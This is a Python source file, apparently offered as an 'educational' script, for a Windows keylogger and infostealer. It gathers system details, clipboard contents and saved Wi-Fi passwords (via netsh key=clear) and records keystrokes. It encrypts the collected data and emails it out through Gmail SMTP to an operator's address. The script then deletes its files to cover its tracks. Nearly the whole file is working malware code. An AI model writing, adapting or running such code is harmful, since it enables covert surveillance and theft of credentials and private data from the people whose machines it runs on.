#Author: VFXGamer
#Note: This is for educational purpose only. I am not responsible for any damages.

# modules required to send an email
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

# for getting computer information
import socket
import platform

# for getting data stored in clipboard
import win32clipboard

# for listening to keystrokes
from pynput.keyboard import Key, Listener

# for uning time related things
import time

# for talking with the operating system
import os

# for encrypting data
from cryptography.fernet import Fernet

# for getting username of the device
import getpass

# for api interactions
from requests import get

import subprocess
import logging

# Start up instances of files and paths

system_information = "system.txt"
clipboard_information = "clipboard.txt"
keys_information = "key_log.txt"
wifi_password = "wifi_password.txt"
keyjack_final = "keyjack_final_.txt"
extend = "\\"

# Encrypted Files
keys_information_e = 'e_keys_logged.txt'
keyjack_final_e = "e_keyjack_final_.txt"

# get the username of the windows pc
username = getpass.getuser()

# path to store files
file_path =  "C:\\Users\\" + username + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\" # Could use any directory here

# Time Controls
time_iteration = 5 # enter the time in seconds for telling kelogger how long it has to run
number_of_iterations_end = 2 # 5000


# Email Controls
email_address = "Enter Email ID"
password = "Enter Your Email account's Password"

# Send to email address
toaddr = "Enter the email id in which you want to recive email" # Use a temporary mail service address, mailinator and temp mail are good services

# Key to Encrypt
key = "sbC9IsydZX1wJB0E2ZIXQhZIEIggXV3mkgqdxyaTfe4=" # generate encryption key and enter into here


# Send to email
def send_email(filename, attachment, toaddr):
    fromaddr = email_address
    # instance of MIMEMultipart
    msg = MIMEMultipart()
    # storing the senders email address
    msg['From'] = fromaddr
    # storing the receivers email address
    msg['To'] = toaddr
    # storing the subject
    msg['Subject'] = "Log File"
    # string to store the body of the mail
    body = "Fresh Logged Keystrokes Ready For You Consumption."
    # attach the body with the msg instance
    msg.attach(MIMEText(body, 'plain'))
    # open the file to be sent
    filename = filename
    attachment = open(attachment, "rb")
    # instance of MIMEBase and named as p
    p = MIMEBase('application', 'octet-stream')
    # To change the payload into encoded form
    p.set_payload((attachment).read())
    # encode into base64
    encoders.encode_base64(p)
    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
    # attach the instance 'p' to instance 'msg'
    msg.attach(p)
    # creates SMTP session
    s = smtplib.SMTP('smtp.gmail.com', 587)
    # start TLS for security
    s.starttls()
    # Authentication
    s.login(fromaddr, password)
    # Converts the Multipart msg into a string
    text = msg.as_string()
    # sending the mail
    s.sendmail(fromaddr, toaddr, text)
    # terminating the session
    s.quit()

# Get Computer and Network Information
def computer_information():
    with open(file_path + extend + system_information, "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get('https://api.ipify.org').text
            f.write("Public IP Address: " + public_ip + "\n")
        except Exception as error:
            f.write("Couldn't get IP Address to do max query\n")
            print(error)

        f.write("System Details: \n")
        f.write("Processor: " + (platform.processor() + "\n"))
        f.write("System: " + platform.system() + " " + platform.version() + "\n")
        f.write("Machine: " + platform.machine() + "\n")
        f.write("Hostname: " + hostname + "\n")
        f.write("Private IP Address: " + IPAddr + "\n")


computer_information()

# Gather clipboard contents
def copy_clipboard():
    with open(file_path + extend + clipboard_information, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("Clipboard Data: \n" + pasted_data, '\n')
        except:
            f.write("Clipboard could not be copied. \n")

copy_clipboard()

# get the wifi name and password stored on the pc
def wifi_passwords():
    with open(file_path + extend + wifi_password, "a") as f:
        data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')
        profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
        for i in profiles:
            results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('utf-8').split(
                '\n')
            results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
            try:
                f.write("Wifi Passwords: ")
                f.write("{:<30} -  {:<}\n".format(i, results[0]))
            except IndexError:
                f.write("{:<30} -  {:<}\n".format(i, ""))

wifi_passwords()

# Time controls for keylogger
number_of_iterations = 0
currentTime = time.time()
stoppingTime = time.time() + time_iteration

while number_of_iterations < number_of_iterations_end:

    count = 0
    keys = []
    counter = 0

    def on_press(key):
        global keys, count, currentTime
        print(key)
        keys.append(key)
        count += 1
        currentTime = time.time()

        if count >= 1:
            count = 0
            write_file(keys)
            keys = []

    # writing keystrokes to a text file
    def write_file(keys):
        with open(file_path + extend + keys_information, "a") as f:
            for key in keys:
                k = str(key).replace("'","")
                if k.find("space") > 0:
                    f.write('\n')
                    f.write('Keystrokes: ')
                    f.close()
                elif k.find("Key") == -1:
                    f.write(k)
                    f.close()

    def on_release(key):
        if key == Key.esc:
            return False
        if currentTime > stoppingTime:
            return False

    with Listener(on_press=on_press, on_release=on_release) as listener: # logs all the keystrokes
        listener.join()

    if currentTime > stoppingTime:
        # Clear contents of keylogger log file.
        with open(file_path + extend + keys_information, "a") as f:
            f.write(" ")
        # Gather clipboard contents and send to email
        copy_clipboard()
        # Increase iteration by 1
        number_of_iterations += 1
        # Update current time
        currentTime = time.time()
        stoppingTime = time.time() + time_iteration

file_merge = file_path + extend

files_to_encrypt = [file_merge + system_information, file_merge + clipboard_information, file_merge + wifi_password, file_merge + keys_information]
encrypt_file = file_merge + keyjack_final_e

# combining all the files to one
def combine_txt_file():
    combfile = open(file_merge + keyjack_final, 'a')
    for filename in files_to_encrypt:
        file = open(f'{filename}', 'r')
        text = file.read()
        combfile.write(text)
        combfile.write('\n')
        file.close()
        os.remove(f"{filename}") # deletes all the different fies after combining all on them in a new file
    combfile.close()

combine_txt_file()

# after combining this will encrypt all the data inside that file
with open(file_merge + keyjack_final, 'rb') as f:
    data = f.read()

fernet = Fernet(key)
encrypted = fernet.encrypt(data)

with open(file_merge + keyjack_final_e, 'wb') as f:
    f.write(encrypted) # we get the encrypted data file

print(send_email(keyjack_final_e, encrypt_file, toaddr)) # calls email funtion and sends our encrypted data file to the entered email address


time.sleep(60) # Sleep time before deleting all files


# deletes all the files to remove all our tracks
delete_files = [keyjack_final, keyjack_final_e]
for file in delete_files:
    os.remove(file_path + extend + file)
